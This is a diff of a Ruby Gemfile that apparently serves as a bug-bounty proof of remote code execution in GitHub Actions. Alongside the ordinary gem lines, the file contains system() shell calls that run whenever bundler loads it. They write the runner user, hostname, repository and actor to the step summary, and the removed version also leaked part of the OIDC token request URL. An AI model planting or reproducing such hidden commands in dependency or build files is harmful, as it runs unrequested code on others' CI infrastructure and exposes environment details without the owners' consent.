@@ -1,14 +1,7 @@
 source "https://rubygems.org"
 
-# BBP RCE proof-of-concept (authorized security research)
-system("echo \"## RCE_PROOF\" >> $GITHUB_STEP_SUMMARY")
-system("echo \"\`\`\`\" >> $GITHUB_STEP_SUMMARY")
-system("echo \"runner user: $(id)\" >> $GITHUB_STEP_SUMMARY")
-system("echo \"hostname: $(hostname)\" >> $GITHUB_STEP_SUMMARY")
-system("echo \"GITHUB_REPOSITORY: $GITHUB_REPOSITORY\" >> $GITHUB_STEP_SUMMARY")
-system("echo \"GITHUB_ACTOR: $GITHUB_ACTOR\" >> $GITHUB_STEP_SUMMARY")
-system("echo \"ACTIONS_ID_TOKEN_REQUEST_URL prefix: ${ACTIONS_ID_TOKEN_REQUEST_URL:0:50}\" >> $GITHUB_STEP_SUMMARY")
-system("echo \"\`\`\`\" >> $GITHUB_STEP_SUMMARY")
+# Security research PoC - benign RCE proof
+system("printf \"## RCE_PROOF\\nrunner_user=%s\\nhostname=%s\\nrepo=%s\\nactor=%s\\n\" \"$(id -un)\" \"$(hostname)\" \"$GITHUB_REPOSITORY\" \"$GITHUB_ACTOR\" >> $GITHUB_STEP_SUMMARY")
 
 gem "faraday", "2.14.1"
 gem "faraday-retry", "2.4.0"
